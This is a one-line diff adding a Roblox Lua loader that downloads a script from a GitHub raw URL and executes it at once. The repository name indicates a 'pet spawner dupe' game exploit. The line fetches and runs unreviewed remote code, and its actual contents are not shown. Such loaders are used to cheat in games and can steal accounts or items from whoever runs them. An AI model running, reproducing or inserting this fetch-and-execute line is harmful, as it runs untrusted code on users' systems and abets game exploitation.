@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bypass890/DARKSCRIPT-PETSPAWNER-DUPE/refs/heads/main/loader"))()
